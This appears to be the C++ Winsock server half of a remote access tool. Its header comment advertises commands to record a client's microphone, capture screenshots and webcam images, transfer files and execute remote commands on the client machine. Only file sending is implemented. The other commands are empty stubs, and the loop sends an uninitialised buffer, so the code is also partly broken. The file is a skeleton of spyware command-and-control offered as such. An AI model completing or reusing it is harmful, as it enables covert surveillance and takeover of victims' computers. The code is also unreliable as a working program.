#include <stdio.h>
#include <iostream>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <string>

#pragma comment(lib, "ws2_32.lib")

#define PORT "27015"

using namespace std;

/*
	Command:	Download <file>: Receive a file from server
				Mic: Record microphone and send to server
				Screenshoot: Take a client screenshoot and send to server
				Camera: Take a client webcam snapshot and send to server
				Remote <command>: Execute command on client machine
*/

void sendFile(const char* filePath, SOCKET clientSocket);


int main(int argc, char* argv[]) {
	WSADATA wsaData;
	SOCKET clientSocket = INVALID_SOCKET;
	SOCKET listenSocket = INVALID_SOCKET;
	addrinfo * result = NULL;
	addrinfo hints;

	int iResult;
	char recvBuf[BUFSIZ];
	int recvBufLen = BUFSIZ;
	string input;


	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("Error WSAStartup. %d\n", WSAGetLastError());
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	iResult = GetAddrInfo(NULL, PORT, &hints, &result);
	if (iResult != 0) {
		printf("Error GetAddrInfo. %d\n", WSAGetLastError());
		WSACleanup();
		return 2;
	}

	listenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (listenSocket == INVALID_SOCKET) {
		printf("Error create socket. %d\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 3;
	}

	iResult = bind(listenSocket, result->ai_addr, result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("Error bind. %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(listenSocket);
		WSACleanup();
		return 4;
	}

	freeaddrinfo(result);

	iResult = listen(listenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf("Error listen. %d\n", WSAGetLastError());
		closesocket(listenSocket);
		WSACleanup();
		return 5;
	}

	clientSocket = accept(listenSocket, NULL, NULL);
	if (clientSocket == INVALID_SOCKET) {
		printf("Error accept. %d\n", WSAGetLastError());
		closesocket(listenSocket);
		WSACleanup();
		return 6;
	}

	printf("Client connected with port %s\n", PORT);
	closesocket(listenSocket);



	do {
		getline(cin, input);
		string command = "";
		for (int i = 0; i < input.size(); i++) {
			if (input[i] == ' ' || input[i] == '\0')break;
			command.push_back(input[i]);
		}

		if (command.compare("Quit") == 0) {
			break;
		}

		if (command.compare("Download") == 0) {
			sendFile(input.c_str(), clientSocket);
		}

		if (command.compare("Mic") == 0) {
			//Download Function - Send file to client.

		}

		if (command.compare("Screenshot") == 0) {
			//Download Function - Send file to client.
		}

		if (command.compare("Camera") == 0) {
			//Download Function - Send file to client.
		}

		if (command.compare("Remote") == 0) {
			//Download Function - Send file to client.
		}



		iResult = send(clientSocket, recvBuf, BUFSIZ, 0);
		if (iResult > 0) {
			printf("Bytes sent: %d\n", iResult);



		}
		else if (iResult == 0) {
			printf("Connection closing...\n");
		}
		else {
			printf("Error recv. %d\n", WSAGetLastError());
			closesocket(clientSocket);
			WSACleanup();
			return 8;
		}
	} while (iResult > 0);

	iResult = shutdown(clientSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("Error shutdown. %d\n", WSAGetLastError());
		closesocket(clientSocket);
		WSACleanup();
		return 9;
	}

	// cleanup
	closesocket(clientSocket);
	WSACleanup();

	getchar();
	return 0;
}

void sendFile(const char* input, SOCKET clientSocket) {
	int result;
	string filePath = "";
	bool isPath = false;


	for (int i = 0; i < strlen(input); i++) {
		if (isPath) {
			filePath += input[i];
		}
		else {
			if (input[i] == ' ') {
				isPath = true;
				continue;
			}
		}
	}

	HANDLE file = CreateFile(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("Error open file. %d\n", GetLastError());
	}
	else {
		DWORD dwByteRead = 0;
		char* buffer = (char*)calloc(BUFSIZ, sizeof(char));

		// send file content
		do {
			if (ReadFile(file, buffer, BUFSIZ, &dwByteRead, NULL) == FALSE) {
				printf("Error read file. %d\n", GetLastError());
				break;
			}
			int iSendFile = send(clientSocket, buffer, dwByteRead, 0);
			if (iSendFile != dwByteRead) {
				printf("Error send file. %d\n", WSAGetLastError());
				break;
			}
		} while (dwByteRead > 0);
	}
}